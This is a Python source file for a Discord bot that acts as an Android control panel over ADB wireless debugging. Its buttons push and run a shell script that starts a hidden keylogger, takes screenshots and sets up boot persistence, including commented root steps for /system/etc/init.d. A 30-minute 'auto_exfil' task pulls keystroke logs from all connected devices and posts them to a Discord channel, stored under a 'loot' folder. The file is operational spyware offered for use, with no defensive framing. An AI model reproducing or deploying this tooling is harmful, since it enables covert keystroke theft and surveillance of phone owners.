import discord
from discord.ext import commands, tasks
import subprocess
import os
import time
import asyncio

# ==========================================
# Configuration
# ==========================================
TOKEN = 'MTE1MzUxNTY3ODkwMTIzNDU2Nzg.UmVwBGFzSB3aXRoIHlvdXIgY2hhbm5lbCBJRApSRU1PVEVfRElS' # Replace with your actual token
CHANNEL_ID = 11535156789012345678 # Replace with your channel ID
REMOTE_DIR = '/sdcard/Download/'
LOCAL_DIR = './loot/'
os.makedirs(LOCAL_DIR, exist_ok=True)

# ==========================================
# Bot Setup
# ==========================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# ==========================================
# Helper Functions
# ==========================================
def get_devices():
    """Returns a list of connected ADB devices."""
    try:
        result = subprocess.run(['adb', 'devices'], capture_output=True, text=True, check=True)
        lines = result.stdout.strip().split('\n')[1:] # Skip the first line "List of devices attached"
        devices = [line.split('\t')[0] for line in lines if '\tdevice' in line]
        return devices
    except subprocess.CalledProcessError as e:
        print(f"Error getting devices: {e}")
        return []

def run_adb_command(device, command, timeout=30):
    """Runs an adb command on a specific device."""
    try:
        full_command = ['adb', '-s', device] + command
        result = subprocess.run(full_command, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return "", "Command timed out."
    except Exception as e:
        return "", str(e)

# ==========================================
# UI Views
# ==========================================
class ADBPairingView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Remote Deploy", style=discord.ButtonStyle.primary, custom_id="btn_deploy")
    async def deploy_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Deployment workflow triggered...", ephemeral=True)

    @discord.ui.button(label="Pair Device", style=discord.ButtonStyle.success, custom_id="btn_pair")
    async def pair_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        instructions = (
            "**Wireless Debugging Setup**\n"
            "1. Go to `Settings -> Developer Options -> Wireless Debugging` on the Android device.\n"
            "2. Enable it and tap **'Pair device with pairing code'**.\n"
            "3. Use the command `!adb_pair <ip>:<port> <code>` with the details shown in the popup.\n"
            "*(Note: The pairing port is different from the main connection port!)*"
        )
        await interaction.response.send_message(instructions, ephemeral=True)

    @discord.ui.button(label="Deploy to All", style=discord.ButtonStyle.danger, custom_id="btn_deploy_all")
    async def deploy_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        devices = get_devices()
        if not devices:
            await interaction.response.send_message("No devices connected.", ephemeral=True)
            return
            
        await interaction.response.send_message(f"Deploying to {len(devices)} devices...", ephemeral=True)
        
        channel = bot.get_channel(CHANNEL_ID)
        if not channel:
            return
            
        success_list = []
        fail_list = []
        
        # Create the remote deploy script locally first
        script_content = \"\"\"#!/bin/sh
# Remote deployment script
# This script will be pushed to paired devices and executed
# It runs our keylogger and exfiltrates data through Discord

# Start keylogger in background
nohup /data/local/tmp/keylogger > /dev/null 2>&1 &

# Take initial screenshot
screencap -p /data/local/tmp/deploy_screen.png

# Log deployment
echo "Remote deployment completed at $(date)" >> /data/local/tmp/deploy.log

# Persistence Setup (Requires Root/System Privileges)
# Create startup script
cat << 'EOF' > /data/local/tmp/startup.sh
#!/bin/sh
nohup /data/local/tmp/keylogger > /dev/null 2>&1 &
EOF
chmod +x /data/local/tmp/startup.sh

# Note: Modifying init.rc or dropping scripts into /system/etc/init.d/ 
# or /data/local/userinit.d/ requires the device to be rooted and the 
# system partition mounted as read-write.
# Example (if rooted):
# mount -o rw,remount /system
# cp /data/local/tmp/startup.sh /system/etc/init.d/99keylogger
# chmod 755 /system/etc/init.d/99keylogger
\"\"\"
        with open("remote_deploy.sh", "w") as f:
            f.write(script_content)
            
        for device in devices:
            try:
                # Push script
                run_adb_command(device, ['push', 'remote_deploy.sh', '/data/local/tmp/remote_deploy.sh'])
                # Make executable
                run_adb_command(device, ['shell', 'chmod', '+x', '/data/local/tmp/remote_deploy.sh'])
                # Execute
                run_adb_command(device, ['shell', '/data/local/tmp/remote_deploy.sh'])
                success_list.append(device)
            except Exception as e:
                fail_list.append(f"{device} ({str(e)})")
                
        # Clean up local script
        if os.path.exists("remote_deploy.sh"):
            os.remove("remote_deploy.sh")
            
        # Report results
        msg = "**Deployment Results**\n"
        if success_list:
            msg += f"✅ **Success ({len(success_list)}):**\n" + "\n".join([f"- `{d}`" for d in success_list]) + "\n\n"
        if fail_list:
            msg += f"❌ **Failed ({len(fail_list)}):**\n" + "\n".join([f"- `{d}`" for d in fail_list])
            
        await channel.send(msg)

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="List Devices", style=discord.ButtonStyle.primary, custom_id="btn_list")
    async def list_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        devices = get_devices()
        if not devices:
            await interaction.response.send_message("No devices connected.", ephemeral=True)
            return
        
        msg = "**Connected Devices:**\n"
        for i, dev in enumerate(devices):
            msg += f"{i+1}. `{dev}`\n"
        await interaction.response.send_message(msg, ephemeral=True)

    @discord.ui.button(label="Deploy Keylogger", style=discord.ButtonStyle.danger, custom_id="btn_deploy_kl")
    async def deploy_kl_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        devices = get_devices()
        if not devices:
            await interaction.response.send_message("No devices connected.", ephemeral=True)
            return
        
        # Deploy to the first device for simplicity in this UI
        device = devices[0]
        await interaction.response.send_message(f"Deploying to `{device}`... Check channel for updates.", ephemeral=True)
        
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            await channel.send(f"Starting deployment on `{device}`...")
            # Run the deploy script
            try:
                # Assuming deploy.sh takes the device ID as an argument
                process = await asyncio.create_subprocess_shell(
                    f"./deploy.sh {device}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                
                if process.returncode == 0:
                    await channel.send(f"Deployment on `{device}` successful!\n```\n{stdout.decode()[:1900]}\n```")
                else:
                    await channel.send(f"Deployment on `{device}` failed:\n```\n{stderr.decode()[:1900]}\n```")
            except Exception as e:
                await channel.send(f"Error running deploy script: {e}")

    @discord.ui.button(label="Pull Logs", style=discord.ButtonStyle.success, custom_id="btn_pull")
    async def pull_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        devices = get_devices()
        if not devices:
            await interaction.response.send_message("No devices connected.", ephemeral=True)
            return
        
        device = devices[0]
        await interaction.response.send_message(f"Pulling logs from `{device}`...", ephemeral=True)
        
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            await send_logs(channel, device, "keylog.txt")

    @discord.ui.button(label="Device Management", style=discord.ButtonStyle.secondary, custom_id="btn_mgmt")
    async def mgmt_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        view = ADBPairingView()
        await interaction.response.send_message("**Device Management**", view=view, ephemeral=True)

# ==========================================
# Commands
# ==========================================
@bot.command(name="menu")
async def show_menu(ctx):
    """Shows the main control menu."""
    view = MainView()
    await ctx.send("**Android Control Panel**", view=view)

@bot.command(name="adb_pair")
async def adb_pair(ctx, ip_port: str, code: str):
    """Pairs and connects to a device via Wireless Debugging"""
    msg = await ctx.send(f"Attempting to pair with `{ip_port}`...")
    
    try:
        # 1. Execute the pairing command
        pair_proc = await asyncio.create_subprocess_shell(
            f"adb pair {ip_port} {code}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await pair_proc.communicate()
        output = stdout.decode().strip() + stderr.decode().strip()

        if "Successfully paired" not in output:
            await msg.edit(content=f"**Pairing Failed:**\n```\n{output}\n```")
            return

        await msg.edit(content=f"**Paired Successfully!**\nNow run `!adb_connect <ip>:<connect_port>` using the port shown on the main Wireless Debugging screen.")

    except Exception as e:
        await msg.edit(content=f"**Error:** {str(e)}")

@bot.command(name="adb_connect")
async def adb_connect(ctx, ip_port: str):
    """Connects to the paired device"""
    msg = await ctx.send(f"Connecting to `{ip_port}`...")
    
    try:
        conn_proc = await asyncio.create_subprocess_shell(
            f"adb connect {ip_port}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await conn_proc.communicate()
        output = stdout.decode().strip()

        if "connected to" in output:
            await msg.edit(content=f"**Connected!** Device `{ip_port}` added to the deployment roster.")
        else:
            await msg.edit(content=f"**Connection Failed:**\n```\n{output}\n```")
            
    except Exception as e:
        await msg.edit(content=f"**Error:** {str(e)}")

# ==========================================
# Tasks
# ==========================================
async def send_logs(channel, device, filename):
    """Pulls a specific log file and sends it to Discord."""
    local_path = os.path.join(LOCAL_DIR, f"{device}_{filename}")
    remote_path = os.path.join(REMOTE_DIR, filename)
    
    # Pull the file
    stdout, stderr = run_adb_command(device, ['pull', remote_path, local_path])
    
    if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
        try:
            with open(local_path, 'rb') as f:
                await channel.send(f"Logs from `{device}`:", file=discord.File(f, filename))
            # Optional: clear the remote file after pulling
            # run_adb_command(device, ['shell', 'rm', remote_path])
        except Exception as e:
            await channel.send(f"Error reading local log file: {e}")
    else:
        await channel.send(f"Failed to pull `{filename}` from `{device}` or file is empty.\n```\n{stderr}\n```")

@tasks.loop(minutes=30)
async def auto_exfil():
    """Automatically pulls logs from all connected devices periodically."""
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print("Auto-exfil: Channel not found.")
        return
        
    devices = get_devices()
    if not devices:
        return
        
    for device in devices:
        # Assuming the keylogger saves to keylog.txt
        await send_logs(channel, device, "keylog.txt")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        view = MainView()
        await channel.send("🤖 **Bot Online & Ready** 🤖\nAuto-exfil is set to 30 minutes.", view=view)
    auto_exfil.start()

bot.run(TOKEN)